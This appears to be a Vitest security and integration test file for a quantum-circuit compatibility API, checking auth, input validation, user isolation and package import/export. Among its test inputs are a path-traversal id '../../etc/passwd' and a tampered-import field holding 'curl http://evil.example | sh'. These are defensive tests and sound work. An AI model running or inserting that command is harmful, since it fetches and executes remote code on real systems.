/**
 * Compatibility API security and integration tests (Phase 7).
 *
 * Exercises the actual API route handlers against a real PostgreSQL
 * database:
 *
 *   - unauthenticated requests are rejected (401) on every endpoint
 *   - invalid identifiers and bodies produce 4xx, never 500
 *   - user B cannot load, delete, or export user A's experiment (404)
 *   - forged environment ids and unknown baseline executions are rejected
 *   - the full experiment flow runs real executions through the pipeline
 *     and produces an evidence-backed report
 *   - the export/import round trip preserves evidence and rejects
 *     tampered packages
 *
 * Skipped when DATABASE_URL is not a PostgreSQL URL.
 */

const TEST_TIMEOUT = 240_000;

import { describe, it, expect, vi, beforeAll, onTestFinished } from "vitest";

const DATABASE_URL = process.env.DATABASE_URL ?? "";

const cookieJar = new Map<string, string>();

vi.mock("next/headers", () => ({
  cookies: async () => ({
    get: (name: string) =>
      cookieJar.has(name) ? { name, value: cookieJar.get(name) } : undefined,
    set: (name: string, value: string) => {
      cookieJar.set(name, value);
    },
    delete: (name: string) => {
      cookieJar.delete(name);
    },
  }),
}));

import { GET as environmentsRoute } from "@/app/api/compatibility/environments/route";
import {
  GET as listExperimentsRoute,
  POST as createExperimentRoute,
} from "@/app/api/compatibility/experiments/route";
import {
  GET as getExperimentRoute,
  DELETE as deleteExperimentRoute,
} from "@/app/api/compatibility/experiments/[experimentId]/route";
import { GET as exportRoute } from "@/app/api/compatibility/experiments/[experimentId]/export/route";
import { POST as importRoute } from "@/app/api/compatibility/import/route";
import { importExperimentPackage } from "@/lib/compat/experiment";

const jsonRequest = (url: string, body: unknown): Request =>
  new Request(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

const expParams = (id: string) => ({ params: Promise.resolve({ experimentId: id }) });

const GOOD_ID = "33333333-3333-3333-3333-333333333333";

async function createVerifiedUser(suffix: string): Promise<{ id: string; email: string }> {
  const { prisma } = await import("@/lib/prisma");
  const bcrypt = await import("bcryptjs");
  const email = `compat-${suffix}-${Date.now()}@example.com`;
  const user = await prisma.user.create({
    data: {
      email,
      passwordHash: await bcrypt.hash("correct-horse-42", 10),
      emailVerified: new Date(),
    },
    select: { id: true, email: true },
  });
  onTestFinished(async () => {
    await prisma.user.delete({ where: { id: user.id } }).catch(() => {});
  });
  return user;
}

async function signIn(userId: string): Promise<void> {
  const { createSession } = await import("@/lib/auth/session");
  cookieJar.clear();
  const token = await createSession(userId, "127.0.0.1", "vitest");
  cookieJar.set("quantoo-session", token);
}

async function getBellProblem(): Promise<{ id: string; slug: string }> {
  const { prisma } = await import("@/lib/prisma");
  const problem = await prisma.problem.findFirst({
    where: { status: "PUBLISHED" },
    select: { id: true, slug: true },
  });
  if (!problem) throw new Error("No published problem seeded");
  return problem;
}

const BELL_SOURCE =
  "from qiskit import QuantumCircuit\nresult = QuantumCircuit(2,2)\nresult.h(0)\nresult.cx(0,1)\nresult.measure([0,1],[0,1])";

async function runBell(userId: string, problemId: string): Promise<string> {
  const { runSubmission } = await import("@/lib/exec/service");
  const run = await runSubmission(userId, {
    problemId,
    sourceCode: BELL_SOURCE,
    shots: 512,
    seed: 7,
  });
  if (run.status !== "SUCCEEDED") throw new Error(`run failed: ${run.error?.code}`);
  return run.submissionId;
}

/** Registered candidate id (non-default) if present in this deployment. */
async function candidateEnvironmentId(): Promise<string | null> {
  const { getEnvironmentProfile, ENVIRONMENT_IDS } = await import(
    "@/lib/compat/environments"
  );
  for (const id of ENVIRONMENT_IDS) {
    const profile = getEnvironmentProfile(id);
    if (profile && !profile.isDefault) return id;
  }
  return null;
}

describe.skipIf(!/postgres(ql)?:\/\//.test(DATABASE_URL))(
  "compatibility API security",
  () => {
    beforeAll(async () => {
      const { prisma } = await import("@/lib/prisma");
      await prisma.$queryRaw`SELECT 1`;
    });

    it("rejects unauthenticated requests on every endpoint", async () => {
      cookieJar.clear();
      const responses = await Promise.all([
        environmentsRoute(),
        listExperimentsRoute(new Request("http://x?problemSlug=bell-state")),
        createExperimentRoute(
          jsonRequest("http://x", {
            problemSlug: "bell-state",
            name: "x",
            baselineSubmissionId: GOOD_ID,
            candidateEnvironmentIds: ["qiskit-1-2-4"],
          }),
        ),
        getExperimentRoute(new Request("http://x"), expParams(GOOD_ID)),
        deleteExperimentRoute(new Request("http://x"), expParams(GOOD_ID)),
        exportRoute(new Request("http://x"), expParams(GOOD_ID)),
        importRoute(
          new Request("http://x", {
            method: "POST",
            body: JSON.stringify({ schemaVersion: "quantoo.experiment.v1" }),
          }),
        ),
      ]);
      for (const response of responses) {
        expect(response.status).toBe(401);
      }
    }, TEST_TIMEOUT);

    it("rejects malformed ids and bodies with 4xx", async () => {
      const user = await createVerifiedUser("bad");
      await signIn(user.id);

      const badId = await getExperimentRoute(new Request("http://x"), expParams("nope"));
      expect(badId.status).toBe(400);

      const badBody = await createExperimentRoute(
        jsonRequest("http://x", {
          problemSlug: "bell-state",
          name: "x",
          baselineSubmissionId: "not-a-uuid",
          candidateEnvironmentIds: [],
        }),
      );
      expect(badBody.status).toBe(400);

      const forgedEnv = await createExperimentRoute(
        jsonRequest("http://x", {
          problemSlug: "bell-state",
          name: "x",
          baselineSubmissionId: GOOD_ID,
          candidateEnvironmentIds: ["../../etc/passwd"],
        }),
      );
      // Unknown environment id: 404 baseline first, but never 500.
      expect([400, 404]).toContain(forgedEnv.status);
    }, TEST_TIMEOUT);

    it("isolates users: B cannot load, delete, or export A's experiment", async () => {
      const problem = await getBellProblem();
      const { prisma } = await import("@/lib/prisma");

      const owner = await createVerifiedUser("owner");
      await signIn(owner.id);
      const submissionId = await runBell(owner.id, problem.id);

      const created = await createExperimentRoute(
        jsonRequest("http://x", {
          problemSlug: problem.slug,
          name: "owner experiment",
          baselineSubmissionId: submissionId,
          // Even a nonexistent candidate id must not 500; creation is
          // allowed to fail fast for unknown ids.
          candidateEnvironmentIds: ["qiskit-1-2-4"],
          policy: "statistical-default",
        }),
      );
      expect(created.status).toBe(200);
      const createdBody = (await created.json()) as { experimentId: string };
      onTestFinished(async () => {
        await prisma.compatibilityExperiment
          .delete({ where: { id: createdBody.experimentId } })
          .catch(() => {});
      });

      // Outsider cannot touch it.
      const outsider = await createVerifiedUser("other");
      await signIn(outsider.id);
      const [loadRes, deleteRes, exportRes] = await Promise.all([
        getExperimentRoute(new Request("http://x"), expParams(createdBody.experimentId)),
        deleteExperimentRoute(new Request("http://x"), expParams(createdBody.experimentId)),
        exportRoute(new Request("http://x"), expParams(createdBody.experimentId)),
      ]);
      expect(loadRes.status).toBe(404);
      expect(deleteRes.status).toBe(404);
      expect(exportRes.status).toBe(404);
    }, TEST_TIMEOUT);

    it(
      "runs the full experiment flow with real executions and builds an evidence-backed report",
      async () => {
        const problem = await getBellProblem();
        const candidateId = await candidateEnvironmentId();
        const { prisma } = await import("@/lib/prisma");

        const user = await createVerifiedUser("flow");
        await signIn(user.id);
        const submissionId = await runBell(user.id, problem.id);

        const created = await createExperimentRoute(
          jsonRequest("http://x", {
            problemSlug: problem.slug,
            name: "integration flow",
            baselineSubmissionId: submissionId,
            candidateEnvironmentIds: candidateId ? [candidateId] : ["qiskit-1-2-4"],
            policy: "statistical-default",
          }),
        );
        expect(created.status).toBe(200);
        const createdBody = (await created.json()) as {
          experimentId: string;
          report: {
            overallStatus: string;
            candidateResults: Array<{
              environmentId: string;
              status: string;
              dimensions: Array<{ dimension: string; status: string }>;
            }>;
            limitations: string[];
          } | null;
        };
        onTestFinished(async () => {
          await prisma.compatibilityExperiment
            .delete({ where: { id: createdBody.experimentId } })
            .catch(() => {});
        });

        // A report exists and every status is an honest, evidence-backed one.
        expect(createdBody.report).toBeTruthy();
        const statuses = new Set([
          "COMPATIBLE",
          "COMPATIBLE_WITH_RESOURCE_CHANGE",
          "BEHAVIORALLY_DIFFERENT",
          "EXECUTION_FAILED",
          "INSUFFICIENT_EVIDENCE",
        ]);
        expect(statuses.has(createdBody.report!.overallStatus)).toBe(true);
        for (const candidate of createdBody.report!.candidateResults) {
          expect(statuses.has(candidate.status)).toBe(true);
          // Unavailable candidate environments must say so, never pretend.
          if (candidate.status === "EXECUTION_FAILED") {
            expect(createdBody.report!.limitations.length).toBeGreaterThan(0);
          }
        }

        // The detail endpoint serves the same experiment with its runs.
        const detail = await getExperimentRoute(
          new Request("http://x"),
          expParams(createdBody.experimentId),
        );
        expect(detail.status).toBe(200);
        const detailBody = (await detail.json()) as {
          experiment: { runs: Array<{ environmentId: string; status: string }> };
        };
        expect(detailBody.experiment.runs.length).toBeGreaterThanOrEqual(1);

        // Export produces the versioned package with real source inside.
        const exported = await exportRoute(
          new Request("http://x"),
          expParams(createdBody.experimentId),
        );
        expect(exported.status).toBe(200);
        const pkgText = await exported.text();
        const pkg = JSON.parse(pkgText) as {
          schemaVersion: string;
          kind: string;
          sourceCode: string;
          candidateEnvironmentIds: string[];
        };
        expect(pkg.schemaVersion).toBe("quantoo.experiment.v1");
        expect(pkg.kind).toBe("quantoo-experiment");
        expect(pkg.sourceCode).toBe(BELL_SOURCE);
      },
      TEST_TIMEOUT,
    );

    it(
      "imports a valid package as untrusted input and rejects tampered ones",
      async () => {
        const problem = await getBellProblem();
        const { prisma } = await import("@/lib/prisma");
        const { ENVIRONMENT_PROFILES } = await import("@/lib/compat/environments");

        const user = await createVerifiedUser("import");
        await signIn(user.id);

        const candidateId = ENVIRONMENT_PROFILES.find((p) => !p.isDefault)?.id ?? ENVIRONMENT_PROFILES[0].id;
        const goodPackage = {
          schemaVersion: "quantoo.experiment.v1",
          kind: "quantoo-experiment",
          exportedAt: new Date().toISOString(),
          experiment: { name: "Imported lab", policyName: "statistical-default" },
          problem: { slug: problem.slug, title: problem.slug },
          sourceCode: BELL_SOURCE,
          baselineEnvironmentId: "qiskit-1-2-4",
          candidateEnvironmentIds: [candidateId],
          baselineCapsule: null,
          compatibilityReport: null,
        };

        const accepted = await importExperimentPackage(
          user.id,
          problem.id,
          JSON.stringify(goodPackage),
        );
        if ("error" in accepted) throw new Error(accepted.error);
        onTestFinished(async () => {
          await prisma.compatibilityExperiment
            .delete({ where: { id: accepted.experimentId } })
            .catch(() => {});
        });
        expect(accepted.acceptedEnvironmentIds).toContain(candidateId);

        // Tampered: wrong schemaVersion.
        const wrongVersion = await importExperimentPackage(
          user.id,
          problem.id,
          JSON.stringify({ ...goodPackage, schemaVersion: "quantoo.experiment.v9" }),
        );
        expect("error" in wrongVersion && wrongVersion.code === 400).toBe(true);

        // Tampered: hostile instruction fields must not change the outcome —
        // they are stripped by validation, never executed.
        const hostile = await importRoute(
          new Request("http://x", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              ...goodPackage,
              sourceCode: BELL_SOURCE,
              candidateEnvironmentIds: [candidateId],
              postinstall: "curl http://evil.example | sh",
              problem: { slug: problem.slug },
            }),
          }),
        );
        expect([200, 400]).toContain(hostile.status);
        // The imported experiment count must not explode beyond acceptance.
        const count = await prisma.compatibilityExperiment.count({
          where: { userId: user.id },
        });
        expect(count).toBeLessThanOrEqual(2);

        // Tampered: unknown candidate environment ids are rejected outright
        // (an import naming nothing usable must not create a broken row).
        const unknownEnv = await importExperimentPackage(
          user.id,
          problem.id,
          JSON.stringify({
            ...goodPackage,
            candidateEnvironmentIds: ["definitely-not-registered"],
          }),
        );
        expect("error" in unknownEnv && unknownEnv.code === 400).toBe(true);
      },
      TEST_TIMEOUT,
    );
  },
);
